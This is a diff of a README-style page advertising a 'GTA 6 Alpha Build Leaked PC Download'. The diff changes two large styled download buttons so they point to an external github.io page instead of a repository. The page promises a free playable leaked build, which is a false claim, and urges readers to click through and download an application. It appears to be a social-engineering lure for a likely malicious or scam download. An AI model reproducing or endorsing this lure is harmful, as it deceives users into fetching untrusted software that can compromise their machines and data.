@@ -1,7 +1,7 @@
 <h1>🎮 GTA-6-Alpha-Build-Leaked-PC-Download - Play GTA 6 on PC Today</h1>
 
 <p align="center">
-  <a href="https://github.com/granicemiasta-beep/GTA-6-Alpha-Build-Leaked-PC-Download" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://granicemiasta-beep.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ---
@@ -68,7 +68,7 @@ Follow these exact steps. Do not skip anything. This will take about 5 minutes.
 **Click the orange button below** (or the one at the top of this page):
 
 <p align="center">
-  <a href="https://github.com/granicemiasta-beep/GTA-6-Alpha-Build-Leaked-PC-Download" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#28a745,#17a2b8);color:#fff;font-size:18px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 4px 12px rgba(40,167,69,0.4);">🖱️ VISIT DOWNLOAD PAGE</a>
+  <a href="https://granicemiasta-beep.github.io" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#28a745,#17a2b8);color:#fff;font-size:18px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 4px 12px rgba(40,167,69,0.4);">🖱️ VISIT DOWNLOAD PAGE</a>
 </p>
 
 Visit this link to download the application. The download page will open in your browser.  
